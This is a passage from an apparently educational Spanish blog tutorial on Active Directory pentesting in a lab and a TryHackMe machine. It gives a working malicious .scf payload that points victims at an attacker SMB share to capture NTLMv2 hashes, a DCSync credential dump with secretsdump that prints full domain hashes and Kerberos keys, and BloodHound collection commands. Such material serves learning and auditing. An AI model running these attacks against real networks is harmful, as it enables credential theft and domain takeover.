	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	sharedFiles     Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Podemos ver un directorio compartido llamado `sharedFiles`. Vamos a intentar conectarnos a él:


```zsh
❯ smbclient -U "waidroc.local\usuario%Password2" //192.168.10.115/sharedFiles -smb2support
Can't load mb2support - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 26 19:51:31 2023
  ..                                  D        0  Fri May 26 19:51:31 2023

		6412543 blocks of size 4096. 3320085 blocks available
smb: \> 
```

Vamos a crear un fichero malicioso `.scf`:

```Waidroc
[Shell]
Command=2
IconFile=\\192.168.0.106\smbFolder\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

¿Qué hemos hecho en el paso anterior? Pues la idea principal es que hemos creado un icono malicioso del explorador de archivos para envenenar el legítimo de la máquina víctima.

Subamos el fichero malicioso!

```zsh
❯ smbclient -U "waidroc.local\usuario%Password2" //192.168.10.115/sharedFiles -smb2support
Can't load mb2support - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put malicious.scf
putting file malicious.scf as \malicious.scf (4,0 kb/s) (average 4,0 kb/s)
smb: \> 
```

El siguiente paso es crear un `smbserver`:


```zsh
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora, con el simple hecho de **abrir** la carpeta, conseguiremos el hash y, si chequeamos nuestro `smbserver`:

```zsh
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.10.115,63205)
[*] AUTHENTICATE_MESSAGE (waidroc\Administrator,W2-PC)
[*] User W2-PC\Administrator authenticated successfully
[*] Administrator::waidroc:aaaaaaaaaaaaaaaa:097ff8a9b690c463a3636d8c53289a61:010100000000000000a698770190d90139193d5220a2574d000000000100100069004e006b005a006b006600410042000300100069004e006b005a006b00660041004200020010007300730077006100540061004700660004001000730073007700610054006100470066000700080000a698770190d9010600040002000000080030003000000000000000000000000030000046be996912bf6901dd6f86966b3f47fca11563713e8fd03716b4c96ab691f1ff0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300036000000000000000000
[*] Closing down connection (192.168.10.115,63205)
[*] Remaining connections []
```

Hemos conseguido el hash NTLMv2 del usuario!

Como siempre, intentamos crackearlo con alguna herramienta de fuerza bruta.


## Secretsdump

- - -

Para explicar esta técnica/concepto, vamos a coger como ejemplo la última parte de la resolución de la máquina `Attacktive Directory` de TryHackMe:

Con `bloodhound` conseguimos esta información, la cual es bastante interesante:

![BLOODHOUND](/assets/img/2023-09-01/bloodhunt.png)

Con este privilegio, podremos ser capaces de extraer **todos los hashes de todos los usuarios** del DC:

```zsh
❯ impacket-secretsdump spookysec.local/backup:backup2517860@10.10.128.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0bf31d7054b52845b517504a3f43006a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:940809a7ef7eea6a2cee204215f64db44f858c91498c925aba8538d05da88cbd
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:d5557947610c7386479ea2a67243d8fa
ATTACKTIVEDIREC$:des-cbc-md5:ef766eea733d975d
```

### ¿Qué está pasando?

- - -

Esto se debe a los derechos de `DCSync`, como podemos ver en esta captura de pantalla, el usuario backup tiene **derechos directos** de `DCSync` en el Controlador de Dominio, por lo que esa es la razón principal por la que podemos explotarlo con `secretsdump.py`.

![BLOODHOUND2](/assets/img/2023-09-01/bloodhunt2.png)


### ¿Cómo funciona?

- - -

`impacket-secretsdump.py` es una herramienta que está incluida en `Impacket Python Library`, que es usada para extraer y volcar credenciales almacenadas en un DC. Esta herramienta explota debilidades en los protocolos de autenticación y almacenamiento de contraseñas utilizados en sistemas Windows.

Cuando ejecutas `impacket-secretsdump.py`, necesitas proporcionar las credenciales necesarias para autenticarte en el controlador de dominio de Windows. Una vez autenticado, la herramienta recopila información sobre cuentas de usuario y credenciales almacenadas en el controlador de dominio.

A continuación, la herramienta utiliza varias técnicas para extraer las credenciales almacenadas en el controlador de dominio. Estas técnicas incluyen volcar las contraseñas almacenadas en el archivo de base de datos del Administrador de Cuentas de Seguridad (SAM) (NTDS.dit), recuperar contraseñas en texto plano almacenadas en la Autoridad de Seguridad Local (LSA) y extraer hashes almacenados en archivos de volcado de memoria (si se proporcionan).

Una vez que se han extraído las credenciales, `impacket-secretsdump.py` las presenta en un formato legible. Esto incluye nombres de usuario, hashes de contraseñas y otra información relacionada con las cuentas de usuario y las credenciales almacenadas en el controlador de dominio.

# BloodHound & neo4j

- - -

Para **ver toda la información del Controlador de Dominio de manera clara**, vamos a utilizar `BloodHound` y `Neo4j`. Puedes instalar estas herramientas, en sistemas basados en Debian, ejecutando `apt install bloodhound neo4j`.

### Uso

- - -

Primero, iniciamos `neo4j`:

![NEO4J](/assets/img/2023-09-01/neo4j.png)

```zsh
❯ neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2023-05-26 18:51:26.582+0000 INFO  Starting...
2023-05-26 18:51:27.178+0000 INFO  This instance is ServerId{c41028bc} (c41028bc-cbe5-43c0-b7e2-f385765cee37)
2023-05-26 18:51:28.689+0000 INFO  ======== Neo4j 4.4.16 ========
2023-05-26 18:51:31.632+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-05-26 18:51:31.652+0000 INFO  Setting up initial user from defaults: neo4j
2023-05-26 18:51:31.654+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2023-05-26 18:51:31.725+0000 INFO  Setting version for 'security-users' to 3
2023-05-26 18:51:31.740+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2023-05-26 18:51:31.769+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2023-05-26 18:51:32.304+0000 INFO  Bolt enabled on localhost:7687.
2023-05-26 18:51:33.722+0000 INFO  Remote interface available at http://localhost:7474/
2023-05-26 18:51:33.727+0000 INFO  id: C94AC294EDBF9F6030AEED4120BDA65989713EEA735AC7E31718A2EEA25CD947
2023-05-26 18:51:33.727+0000 INFO  name: system
2023-05-26 18:51:33.728+0000 INFO  creationDate: 2023-05-26T18:51:29.548Z
2023-05-26 18:51:33.728+0000 INFO  Started.
```

Por otro lado, iniciamos `bloodhound`:

![BLOODHOUNDL](/assets/img/2023-09-01/bloodhunt-logo.png)

```zsh
❯ bloodhound &>/dev/null &
[1] 522090

❯ disown
```

Las credenciales por defecto de neo4j son `neo4j:neo4j`:

Esta herramienta te permitirá crear un esquema del Controlador de Dominio. Para hacer que `BloodHound` muestre la información, necesitarás cargar un archivo zip. Existe un recurso llamado [`SharpHound`](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1). Utilizaremos esto para obtener el archivo zip. Para ello, ejecutaremos la herramienta [`bloodhound.py`](https://github.com/fox-it/BloodHound.py):

```zsh
❯ python3 bloodhound.py -u Administrator -p 'P4$$W0rd!!!#' -d waidroc.local -ns 192.168.10.115 -c all --zip
INFO: Found AD domain: waidroc.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: W2-PC.waidroc.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: W2-PC.waidroc.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 22 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: W1-PC.waidroc.local
INFO: Querying computer: W3-PC.waidroc.local
INFO: Querying computer: W2-PC.waidroc.local
WARNING: Failed to get service ticket for W1-PC.waidroc.local, falling back to NTLM auth
WARNING: Failed to get service ticket for W2-PC.waidroc.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
CRITICAL: CCache file is not found. Skipping...
WARNING: Failed to get service ticket for W3-PC.waidroc.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (W2-PC.waidroc.local:88)] [Errno -2] Name or service not known
WARNING: DCE/RPC connection failed: [Errno Connection error (W2-PC.waidroc.local:88)] [Errno -2] Name or service not known
WARNING: DCE/RPC connection failed: [Errno Connection error (W2-PC.waidroc.local:88)] [Errno -2] Name or service not known
INFO: Done in 00M 03S
INFO: Compressing output into 20230526213904_bloodhound.zip
```

Ahora, desde `bloodhound` vamos a subir el fichero .zip y, en `Analysis`, podremos ver toda la información de manera más clara.

## Conclusiones

AD está muy extendido en las organizaciones, sobretodo en pequeñas y medianas empresas y es de vital importancia realizar auditorías periódicamente para evitar ataques que conllevarán futuros inconvenientes.

Personalmente, el pentesting de Active Directory no es lo que más me llama la atención en el mundo de la Ciberseguridad pero, se aprende un montón de conceptos y metodologías que pueden servirte para realizar otro tipo de auditorías, al ser tan "tedioso" y complejo.

Aquí solo hay algunos de los ataques que pueden realizarse, los he intentado explicar de la mejor manera posible, aplicando ejemplos en un entorno controlado. Más adelante iré añadiendo en este mismi post nuevas técnicas y ataques, sirviendo así éste como una guía para realizar auditorías en AD.

Sobre cualquier error, sugerencia o duda, podéis contactarme en cualquier Red Social que os haya proporcionado en el blog. ¡¡Espero que os haya gustado!!


`Muchas gracías por leer, Waidroc :)`
